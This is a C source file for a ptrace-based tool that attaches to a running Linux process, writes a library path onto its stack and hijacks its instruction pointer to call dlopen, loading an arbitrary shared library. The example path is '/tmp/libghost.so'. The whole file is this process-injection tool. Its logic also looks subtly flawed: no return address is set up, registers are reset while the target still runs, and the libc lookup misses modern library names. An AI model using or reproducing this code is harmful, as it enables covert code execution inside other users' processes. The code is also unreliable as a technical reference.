#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>

#define MAX_PATH_LEN 256

static int safe_ptrace(int request, pid_t pid, void *addr, void *data) {
    int ret = ptrace(request, pid, addr, data);
    if (ret < 0 && errno != 0) {
        return -1;
    }
    return ret;
}

static unsigned long parse_hex(const char *hex) {
    unsigned long val = 0;
    while (*hex) {
        val <<= 4;
        if (*hex >= '0' && *hex <= '9') val += *hex - '0';
        else if (*hex >= 'a' && *hex <= 'f') val += *hex - 'a' + 10;
        else if (*hex >= 'A' && *hex <= 'F') val += *hex - 'A' + 10;
        hex++;
    }
    return val;
}

static unsigned long get_libc_base(const char *maps_path) {
    FILE *f = fopen(maps_path, "r");
    if (!f) return 0;
    
    char line[512];
    unsigned long base = 0;
    
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "libc-") && strstr(line, "r-xp")) {
            base = parse_hex(line);
            break;
        }
    }
    
    fclose(f);
    return base;
}

static long get_remote_dlopen_addr(pid_t pid) {
    char maps_path[64];
    unsigned long local_libc_base = 0, remote_libc_base = 0;
    unsigned long dlopen_local = 0;
    long offset = 0;
    char line[512];
    FILE *f;
    
    f = fopen("/proc/self/maps", "r");
    if (!f) {
        perror("fopen local maps");
        return 0;
    }
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "libc-") && strstr(line, "r-xp")) {
            local_libc_base = parse_hex(line);
            break;
        }
    }
    fclose(f);
    
    if (local_libc_base == 0) {
        fprintf(stderr, "Failed to find local libc base\n");
        return 0;
    }
    
    void *handle = dlopen(NULL, RTLD_LAZY);
    if (!handle) {
        fprintf(stderr, "dlopen(NULL) failed\n");
        return 0;
    }
    void *sym = dlsym(handle, "dlopen");
    if (!sym) {
        fprintf(stderr, "dlsym dlopen failed\n");
        return 0;
    }
    dlopen_local = (unsigned long)sym;
    offset = dlopen_local - local_libc_base;
    
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    remote_libc_base = get_libc_base(maps_path);
    
    if (remote_libc_base == 0) {
        fprintf(stderr, "Failed to find remote libc base in /proc/%d/maps\n", pid);
        fprintf(stderr, "Hint: Target process may not have libc mapped or no read access\n");
        return 0;
    }
    
    return (long)(remote_libc_base + offset);
}

static int inject_path(int pid, unsigned long addr, const char *path) {
    size_t len = strlen(path) + 1;
    size_t words = (len + sizeof(long) - 1) / sizeof(long);
    unsigned long *data = (unsigned long *)calloc(words, sizeof(unsigned long));
    if (!data) return -1;
    
    memcpy(data, path, len);
    
    for (size_t i = 0; i < words; i++) {
        errno = 0;
        long ret = ptrace(PTRACE_POKEDATA, pid, addr + (i * sizeof(long)), data[i]);
        if (ret < 0 && errno != 0) {
            free(data);
            return -1;
        }
    }
    
    free(data);
    return 0;
}

int inject_so(pid_t pid, const char *so_path) {
    if (pid <= 0 || !so_path) {
        fprintf(stderr, "Invalid parameters\n");
        return -1;
    }
    
    if (strlen(so_path) >= MAX_PATH_LEN) {
        fprintf(stderr, "Path too long\n");
        return -1;
    }
    
    long dlopen_addr = get_remote_dlopen_addr(pid);
    if (dlopen_addr == 0) {
        fprintf(stderr, "Failed to resolve remote dlopen address (ASLR issue)\n");
        return -1;
    }
    
    printf("[+] dlopen address in target: 0x%lx\n", dlopen_addr);
    
    if (safe_ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        perror("ptrace attach");
        return -1;
    }
    
    int status;
    waitpid(pid, &status, 0);
    if (!WIFSTOPPED(status)) {
        fprintf(stderr, "Target process did not stop\n");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }
    
    struct user_regs_struct regs, old_regs;
    if (safe_ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) {
        perror("ptrace getregs");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }
    memcpy(&old_regs, &regs, sizeof(regs));
    
    unsigned long inj_addr = (unsigned long)regs.rsp - 256;
    if (inject_path(pid, inj_addr, so_path) < 0) {
        fprintf(stderr, "Failed to inject path\n");
        ptrace(PTRACE_SETREGS, pid, NULL, &old_regs);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }
    
    regs.rip = (unsigned long)dlopen_addr;
    regs.rdi = inj_addr;
    regs.rsi = RTLD_LAZY;
    
    if (safe_ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
        perror("ptrace setregs");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }
    
    if (safe_ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
        perror("ptrace cont");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }
    
    usleep(200000);
    
    safe_ptrace(PTRACE_SETREGS, pid, NULL, &old_regs);
    safe_ptrace(PTRACE_DETACH, pid, NULL, NULL);
    
    printf("[+] Injection complete. Check target for loaded library.\n");
    return 0;
}

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <pid> <path_to_so>\n", argv[0]);
        fprintf(stderr, "Example: %s 1234 /tmp/libghost.so\n", argv[0]);
        return 1;
    }
    
    pid_t pid = atoi(argv[1]);
    const char *so_path = argv[2];
    
    printf("[*] Injecting into PID %d\n", pid);
    printf("[*] Library: %s\n", so_path);
    
    return inject_so(pid, so_path);
}
